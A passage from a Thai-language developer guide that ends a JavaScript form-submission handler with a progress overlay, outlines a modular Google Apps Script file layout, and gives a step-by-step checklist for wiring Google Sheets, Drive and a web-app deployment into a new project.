      SubmissionProgress.complete('ส่งข้อมูลสำเร็จเรียบร้อยแล้ว!', () => {
        alert('บันทึกสำเร็จ!');
        document.getElementById('myForm').reset();
      });
    } else {
      throw new Error(data.error?.message || 'บันทึกล้มเหลว');
    }

  } catch (err) {
    // กรณีเกิด Error
    SubmissionProgress.error(err.message, () => {
      SubmissionProgress.reset();
    });
  }
}
```

---

## 4. โครงสร้างโค้ด Google Apps Script (Clean Modular Architecture)

แนะนำให้แยกไฟล์ใน Google Apps Script Editor ตามหลัก **Single Responsibility Principle (SRP)** เหมือนในโปรเจกต์นี้ เพื่อให้ดูแลรักษาง่าย:

```
appscript/
├── Code.gs         # Entry Points (doGet, doPost) และ Request Router
├── Config.gs       # จัดการ Script Properties, รหัสผ่าน, และ ค่าคงที่ของระบบ
├── Sheets.gs       # จัดการฐานข้อมูล Spreadsheet, setupDatabase(), อ่าน/เขียนแถว
├── Drive.gs        # จัดการ Google Drive, สร้างโฟลเดอร์ย่อย, อัปโหลด Base64, ลบไฟล์
├── Submissions.gs  # Business Logic ของงานส่ง (Validation, Upload Drive, Lock Sheet)
├── Auth.gs         # ระบบยืนยันตัวตน Admin Password & Session Tokens
└── Utils.gs        # ฟังก์ชันเสริม (UUID, getIsoTimestamp, sanitizeForSheet, JSON Envelopes)
```

---

## 5. Checklist การนำไปใช้กับโปรเจกต์ใหม่ใน 15 นาที

เมื่อคุณต้องการสร้างโปรเจกต์ใหม่ด้วย Tech Stack นี้ ให้ทำตามลำดับต่อไปนี้:

- [ ] **1. ฝั่ง Google Sheets & Drive:**
  - สร้าง Google Spreadsheet ใหม่เปล่าๆ 1 ไฟล์ -> ก็อปปี้ Spreadsheet ID จาก URL
  - สร้าง Google Drive Folder ใหม่ 1 โฟลเดอร์ -> ก็อปปี้ Folder ID จาก URL
- [ ] **2. ฝั่ง Google Apps Script:**
  - เปิดเมนู **ส่วนขยาย (Extensions) ➔ Apps Script**
  - ก็อปปี้ไฟล์ `.gs` ทั้งหมด (`Code.gs`, `Config.gs`, `Sheets.gs`, `Drive.gs`, `Submissions.gs`, `Utils.gs`) ไปวาง
  - ไปที่ **Project Settings (รูปเฟือง) ➔ Script Properties** แล้วเพิ่ม 3 ค่า:
    - `SPREADSHEET_ID`: วาง ID ของชีต
    - `ROOT_DRIVE_FOLDER_ID`: วาง ID ของโฟลเดอร์ Drive
    - `ADMIN_PASSWORD`: กำหนดรหัสผ่านผู้ดูแลระบบ
  - เลือกฟังก์ชัน `setupDatabase` ในแถบเครื่องมือแล้วกด **Run** 1 ครั้งเพื่อให้ระบบสร้างตารางและจัดฟอร์แมตอัตโนมัติ
  - กด **Deploy ➔ New deployment ➔ Select type: Web app**:
    - *Execute as:* **Me (บัญชีของคุณ)**
    - *Who has access:* **Anyone (ทุกคน)**
    - ก็อปปี้ Web App URL ที่ได้ (ลงท้ายด้วย `/exec`)
- [ ] **3. ฝั่ง Frontend (Web App / HTML):**
  - นำ Web App URL ไปใส่ในตัวแปร `APP_CONFIG.API_URL`
  - นำเข้าไฟล์ `image-utils.js` และ `progress-controller.js`
  - ใส่ HTML Markup ของ `submissionProgressOverlay` ในหน้าเว็บ
  - ใส่ CSS ของ Progress Bar ในไฟล์ Stylesheet
- [ ] **4. ทดสอบ:**
  - เปิดหน้าเว็บ กรอกข้อมูล และเลือกรูปภาพ -> กดส่งงาน
  - ตรวจสอบว่าแถบเปอร์เซ็นต์ขยับจาก 15% ➔ 35% ➔ 65% ➔ 88% ➔ 100%
  - ตรวจสอบว่ารูปเข้า Google Drive โฟลเดอร์ที่ถูกต้อง และแถวข้อมูลบันทึกลง Google Sheets ครบถ้วน!

---

💡 *เอกสารนี้ถูกรวบรวมจากสถาปัตยกรรมระดับ Production ของ Hongson WebApp Innovators สามารถนำส่วนประกอบทั้งหมดไปต่อยอดได้ทันทีในทุกโปรเจกต์!*
